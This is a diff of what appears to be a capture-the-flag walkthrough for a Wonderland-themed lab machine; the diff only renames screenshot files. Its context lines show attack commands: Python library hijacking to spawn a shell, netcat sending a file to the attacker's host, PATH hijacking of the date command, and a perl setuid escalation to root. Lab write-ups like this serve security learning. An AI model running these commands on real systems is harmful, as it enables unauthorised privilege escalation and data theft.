@@ -9,7 +9,7 @@
 <pre><code><strong>nmap -A $VICTIM
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (11).png" alt=""><figcaption></figcaption></figure>
 
 ## Scan all ports
 
@@ -87,7 +87,7 @@ python3 -c 'import sys; print (sys.path)'
 locate random.py
 ```
 
-<figure><img src="../../.gitbook/assets/image (10) (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -97,7 +97,7 @@ echo 'os.system("/bin/bash")' >> random.py
 cat random.py
 ```
 
-<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (11).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -105,11 +105,11 @@ cat random.py
 sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 ```
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (14).png" alt=""><figcaption></figcaption></figure>
 
 
 
-<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13) (11).png" alt=""><figcaption></figcaption></figure>
 
 ## Lateral Movement - Abusing Paths
 
@@ -129,7 +129,7 @@ nc -w 3 $KALI 1234 < teaParty
 
 I opened the file in Ghidra and can see that the program is running the date command which we see outputted when we run the script. But note that the date command isn't using the full path so if we add somewhere else in our path we can run our own date command instead.
 
-<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (14) (12).png" alt=""><figcaption></figcaption></figure>
 
 I added tmp to my path
 
@@ -141,7 +141,7 @@ export PATH=/tmp:$PATH
 echo $PATH
 ```
 
-<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (15) (10).png" alt=""><figcaption></figcaption></figure>
 
 I'm not the hatter
 
@@ -156,7 +156,7 @@ cat date
 /home/rabbit/teaParty 
 ```
 
-<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (16) (8).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation&#x20;
 
@@ -171,7 +171,7 @@ getcap -r / 2>/dev/null
 perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
 ```
 
-<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (17) (7).png" alt=""><figcaption></figcaption></figure>
 
 
 
